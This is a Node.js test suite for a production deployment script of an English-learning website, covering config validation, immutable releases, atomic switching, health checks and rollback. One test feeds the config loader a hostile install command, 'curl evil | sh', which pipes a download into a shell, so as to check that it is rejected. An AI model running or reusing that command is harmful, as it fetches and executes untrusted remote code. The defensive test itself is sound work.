import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import { promisify } from "node:util";

import {
  createProductionDeployment,
  loadProductionDeploymentConfig,
  PRODUCTION_REMOTE_SOURCE,
} from "../../scripts/deploy-production-candidate.mjs";

const runFile = promisify(execFile);

const SHA = "1111111111111111111111111111111111111111";
const baseEnvironment = {
  PRODUCTION_RELEASE_MODE: "upload",
  PRODUCTION_CANDIDATE_COMMIT: SHA,
  PRODUCTION_MANIFEST_CHECKSUM: "manifest-abc",
  PRODUCTION_VERSION_ID: "v1.0.3",
  PRODUCTION_PLATFORM: "web",
  PRODUCTION_ARTIFACT_IDENTITY: '{"digest":"sha256:artifact","object":"candidate.tgz"}',
  PRODUCTION_IDEMPOTENCY_KEY: "idem-1",
  PRODUCTION_CONFIG_PATH: "/private/production.json",
};

const productionConfig = {
  sshHost: "deploy@prod.example.com",
  remoteNodePath: "/opt/node/bin/node",
  remoteBinPath: "/opt/node/bin",
  currentLinkMode: "shared",
  releaseRoot: "/opt/e365-production",
  repoPath: "/srv/e365.git",
  sharedEnvPath: "/opt/e365-production/shared/.env",
  publicUrl: "https://365english.online",
  adminUrl: "https://admin.365english.online",
  apiReadyUrl: "https://api.365english.online/health/ready",
  databaseReadyCommand: ["node", "scripts/check-db.mjs"],
  redisReadyCommand: ["node", "scripts/check-redis.mjs"],
  installCommand: ["pnpm", "install", "--frozen-lockfile"],
  buildCommand: ["pnpm", "build"],
  restartCommand: ["pm2", "restart", "e365-api", "e365-worker", "--update-env"],
};

test("production config requires an absolute remote Node executable", () => {
  assert.equal(loadProductionDeploymentConfig(productionConfig).remoteNodePath, "/opt/node/bin/node");
  assert.equal(loadProductionDeploymentConfig(productionConfig).remoteBinPath, "/opt/node/bin");
  assert.throws(
    () => loadProductionDeploymentConfig({ ...productionConfig, remoteNodePath: "node" }),
    /remoteNodePath must be an absolute path/,
  );
  assert.throws(
    () => loadProductionDeploymentConfig({ ...productionConfig, remoteBinPath: "bin" }),
    /remoteBinPath must be an absolute path/,
  );
});

test("shared production topology switches the real current link for every platform", async () => {
  const effects = [];
  const deployment = createProductionDeployment({
    environment: baseEnvironment,
    config: productionConfig,
    operations: {
      runLocal: async () => ({}),
      runRemote: async (_host, operation, payload) => {
        effects.push([operation, payload]);
        if (operation === "read-current") return "/opt/e365-production/releases/old";
        return { ok: true };
      },
      readRemoteState: async () => ({ previousReleasePath: "/opt/e365-production/releases/old" }),
      writeRemoteStateAtomic: async () => {},
      probe: async () => ({ ok: true, status: 200 }),
      now: () => "2026-08-12T00:00:00.000Z",
    },
  });
  await deployment.execute("switch");
  const switched = effects.find(([operation]) => operation === "switch-current-atomic");
  assert.equal(switched[1].platform, null);
});

test("shared Web and API targets reuse one immutable release identity", async () => {
  const identities = [];
  for (const platform of ["web", "api"]) {
    const deployment = createProductionDeployment({
      environment: { ...baseEnvironment, PRODUCTION_PLATFORM: platform },
      config: productionConfig,
      operations: {
        runLocal: async () => ({}),
        runRemote: async (_host, operation, payload) => {
          if (operation === "prepare-immutable-release") identities.push(payload.identity);
          if (operation === "inspect-immutable-release") return { complete: true };
          return { ok: true };
        },
        readRemoteState: async () => null, writeRemoteStateAtomic: async () => {},
        probe: async () => ({ ok: true, status: 200 }), now: () => "2026-08-12T00:00:00.000Z",
      },
    });
    await deployment.execute("upload");
  }
  assert.deepEqual(identities[0], identities[1]);
  assert.equal(identities[0].platform, "shared");
});

test("the authoritative API readiness endpoint can supply database and Redis evidence", async () => {
  const effects = [];
  const config = { ...productionConfig, databaseReadyCommand: null, redisReadyCommand: null };
  const deployment = createProductionDeployment({
    environment: baseEnvironment, config,
    operations: {
      runLocal: async () => ({}), runRemote: async () => ({ ok: true }),
      readRemoteState: async () => ({ previousReleasePath: "/old" }),
      writeRemoteStateAtomic: async () => {},
      probe: async (url) => {
        effects.push(url);
        return url === config.apiReadyUrl
          ? { ok: true, status: 200, body: { status: "ok", checks: { db: "ok", redis: "ok" } } }
          : { ok: true, status: 200 };
      },
      now: () => "2026-08-12T00:00:00.000Z",
    },
  });
  assert.deepEqual(await deployment.execute("health"), { ok: true, status: 200 });
  assert.equal(effects.includes(config.apiReadyUrl), true);
});

test("production deployment config rejects staging defaults and unsafe commands", () => {
  assert.throws(() => loadProductionDeploymentConfig({ ...productionConfig, publicUrl: "https://test-au.365english.online" }), /staging/i);
  assert.throws(() => loadProductionDeploymentConfig({ ...productionConfig, installCommand: ["bash", "-c", "curl evil | sh"] }), /allowlist/i);
  assert.throws(() => loadProductionDeploymentConfig({ ...productionConfig, releaseRoot: "/opt/e365-staging" }), /staging/i);
});

test("production deployment uses immutable releases, shared env, atomic switch, complete health, and authoritative state", async () => {
  const effects = [];
  const files = new Map();
  let immutableComplete = false;
  const deployment = createProductionDeployment({
    environment: baseEnvironment,
    config: productionConfig,
    operations: {
      runLocal: async (file, args, options) => effects.push(["local", file, args, options]),
      runRemote: async (host, operation, payload) => {
        effects.push(["remote", host, operation, payload]);
        if (operation === "read-current") return "/opt/e365-production/releases/old";
        if (operation === "inspect-immutable-release") return { complete: immutableComplete };
        if (operation === "write-release-metadata") immutableComplete = true;
        if (operation === "read-release-metadata") return {
          candidateCommit: SHA, manifestChecksum: "manifest-abc",
          artifactIdentity: { digest: "sha256:artifact", object: "candidate.tgz" },
          releaseId: "v1.0.3-manifest-abc-shared-11111111",
        };
        return { ok: true };
      },
      probe: async (url) => { effects.push(["probe", url]); return { ok: true, status: 200 }; },
      readRemoteState: async (_host, path) => files.get(path) ?? null,
      writeRemoteStateAtomic: async (_host, path, value) => { effects.push(["write", path, value]); files.set(path, value); },
      now: () => "2026-08-11T12:00:00.000Z",
    },
  });

  const uploaded = await deployment.execute("upload");
  assert.match(uploaded.object, /^\/opt\/e365-production\/releases\/v1\.0\.3-manifest-abc-shared-/);
  assert.ok(effects.some((entry) => entry[0] === "local" && entry[1] === "git" && entry[2].includes(SHA)));
  assert.ok(effects.some((entry) => entry[0] === "local" && entry[1] === "rsync"));
  const rsyncCount = effects.filter((entry) => entry[0] === "local" && entry[1] === "rsync").length;
  await deployment.execute("upload");
  assert.equal(effects.filter((entry) => entry[0] === "local" && entry[1] === "rsync").length, rsyncCount);
  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "link-shared-env" && entry[3].envPath === productionConfig.sharedEnvPath));
  const switched = await deployment.execute("switch");
  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "switch-current-atomic"));
  assert.equal(switched.productionReleaseId.startsWith("v1.0.3-manifest-abc-shared-"), true);
  const health = await deployment.execute("health");
  assert.equal(health.ok, true);
  assert.deepEqual(effects.filter((entry) => entry[0] === "probe").map((entry) => entry[1]), [productionConfig.publicUrl, productionConfig.adminUrl, productionConfig.apiReadyUrl]);
  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "ready-command" && entry[3].kind === "database"));
  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "ready-command" && entry[3].kind === "redis"));
  const state = files.get("/opt/e365-production/state/web.json");
  assert.equal(state.candidateCommit, SHA);
  assert.deepEqual(state.artifactIdentity, { digest: "sha256:artifact", object: "candidate.tgz" });
  assert.equal(state.manifestChecksum, "manifest-abc");
  // A real CLI invocation reads the switched platform entry; update the fake's current response.
  const readCurrent = effects.find((entry) => entry[0] === "remote" && entry[2] === "switch-current-atomic")[3].releasePath;
  // The fake above is intentionally state-free; its read-current response is represented by the written state.
  files.get("/opt/e365-production/state/web.json").currentReleasePath = readCurrent;
  // Create a fresh readback view that returns the switched remote symlink.
  const readbackDeployment = createProductionDeployment({
    environment: baseEnvironment, config: productionConfig,
    operations: {
      runLocal: async () => {},
      runRemote: async (_host, operation) => operation === "read-current" ? readCurrent : {
        candidateCommit: SHA, manifestChecksum: "manifest-abc",
        artifactIdentity: { digest: "sha256:artifact", object: "candidate.tgz" },
        releaseId: "v1.0.3-manifest-abc-shared-11111111",
      },
      probe: async () => ({ ok: true }), readRemoteState: async (_host, path) => files.get(path),
      writeRemoteStateAtomic: async () => {}, now: () => "2026-08-11T12:00:00.000Z",
    },
  });
  const readback = await readbackDeployment.execute("readback");
  assert.equal(readback.authoritative, true);
  assert.equal(readback.published, true);
});

test("failed health restores previous release and records failed and rollback observations", async () => {
  const effects = [];
  const files = new Map();
  const deployment = createProductionDeployment({
    environment: baseEnvironment,
    config: productionConfig,
    operations: {
      runLocal: async () => {},
      runRemote: async (_host, operation, payload) => {
        effects.push([operation, payload]);
        if (operation === "read-current") return "/opt/e365-production/releases/old";
        return { ok: true };
      },
      probe: async () => ({ ok: false, status: 503 }),
      readRemoteState: async (_host, path) => files.get(path) ?? null,
      writeRemoteStateAtomic: async (_host, path, value) => files.set(path, value),
      now: () => "2026-08-11T12:00:00.000Z",
    },
  });
  await deployment.execute("upload");
  await deployment.execute("switch");
  await assert.rejects(deployment.execute("health"), /health/i);
  assert.ok(effects.some(([operation]) => operation === "restore-current-atomic"));
  const state = files.get("/opt/e365-production/state/web.json");
  assert.equal(state.status, "rolled_back");
  assert.equal(state.failedObservation.healthStatus, "unhealthy");
  assert.equal(state.rollbackObservation.currentReleasePath, "/opt/e365-production/releases/old");
});

test("pre-switch failures never change current production entry", async () => {
  const effects = [];
  const deployment = createProductionDeployment({
    environment: baseEnvironment,
    config: productionConfig,
    operations: {
      runLocal: async () => { throw new Error("build failed"); },
      runRemote: async (_host, operation) => effects.push(operation),
      probe: async () => ({ ok: true }), readRemoteState: async () => null, writeRemoteStateAtomic: async () => {}, now: () => "2026-08-11T12:00:00.000Z",
    },
  });
  await assert.rejects(deployment.execute("upload"), /build failed/);
  assert.equal(effects.includes("switch-current-atomic"), false);
});

test("restart failure restores and restarts the previous platform entry before recording rollback", async () => {
  const effects = [];
  const files = new Map([["/opt/e365-production/state/web.json", { previousReleasePath: "/opt/e365-production/releases/old" }]]);
  let restartCount = 0;
  const deployment = createProductionDeployment({
    environment: baseEnvironment, config: productionConfig,
    operations: {
      runLocal: async () => {},
      runRemote: async (_host, operation, payload) => {
        effects.push([operation, payload]);
        if (operation === "restart" && restartCount++ === 0) throw new Error("new release restart failed");
        return { ok: true };
      },
      probe: async () => ({ ok: true }), readRemoteState: async (_host, path) => files.get(path),
      writeRemoteStateAtomic: async (_host, path, value) => files.set(path, value), now: () => "2026-08-11T12:00:00.000Z",
    },
  });
  await assert.rejects(deployment.execute("switch"), /restart failed/);
  assert.deepEqual(effects.filter(([operation]) => ["restore-current-atomic", "restart"].includes(operation)).map(([operation]) => operation), ["restart", "restore-current-atomic", "restart"]);
  assert.equal(files.get("/opt/e365-production/state/web.json").rollbackObservation.restored, true);
});

test("authoritative readback rejects a remote current entry or metadata mismatch", async () => {
  const files = new Map([["/opt/e365-production/state/web.json", {
    status: "published", candidateCommit: SHA, manifestChecksum: "manifest-abc",
    artifactIdentity: { digest: "sha256:artifact", object: "candidate.tgz" },
    releaseId: "v1.0.3-manifest-abc-shared-11111111", externalRequestId: "idem-1", healthStatus: "healthy",
  }]]);
  const deployment = createProductionDeployment({
    environment: baseEnvironment, config: productionConfig,
    operations: {
      runLocal: async () => {},
      runRemote: async (_host, operation) => operation === "read-current" ? "/opt/e365-production/releases/other" : { ok: true },
      probe: async () => ({ ok: true }),
      readRemoteState: async (_host, path) => files.get(path),
      writeRemoteStateAtomic: async () => {}, now: () => "2026-08-11T12:00:00.000Z",
    },
  });
  await assert.rejects(deployment.execute("readback"), /authoritative.*mismatch/i);
});

test("real remote protocol resumes the same partial immutable release and rejects identity drift", async (t) => {
  const root = await mkdtemp(path.join(tmpdir(), "e365-production-protocol-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  const releasePath = path.join(root, "releases", "release-1");
  await runFile("node", ["-e", PRODUCTION_REMOTE_SOURCE, "preflight", Buffer.from(JSON.stringify({ releaseRoot: root })).toString("base64url")]);
  const identity = { versionId: "v1", candidateCommit: SHA, manifestChecksum: "sum", artifactIdentity: { digest: "git:1" }, platform: "web", releaseId: "release-1" };
  const args = ["-e", PRODUCTION_REMOTE_SOURCE, "prepare-immutable-release", Buffer.from(JSON.stringify({ releasePath, identity })).toString("base64url")];
  await runFile("node", args);
  await runFile("node", args);
  const inspect = async () => JSON.parse((await runFile("node", ["-e", PRODUCTION_REMOTE_SOURCE, "inspect-immutable-release", Buffer.from(JSON.stringify({ releasePath, identity })).toString("base64url")])).stdout);
  assert.deepEqual(await inspect(), { complete: false });
  await runFile("node", ["-e", PRODUCTION_REMOTE_SOURCE, "write-release-metadata", Buffer.from(JSON.stringify({ releasePath, metadata: identity })).toString("base64url")]);
  assert.deepEqual(await inspect(), { complete: true });
  await assert.rejects(
    runFile("node", ["-e", PRODUCTION_REMOTE_SOURCE, "prepare-immutable-release", Buffer.from(JSON.stringify({ releasePath, identity: { ...identity, candidateCommit: "2".repeat(40) } })).toString("base64url")]),
    /identity mismatch/,
  );
});
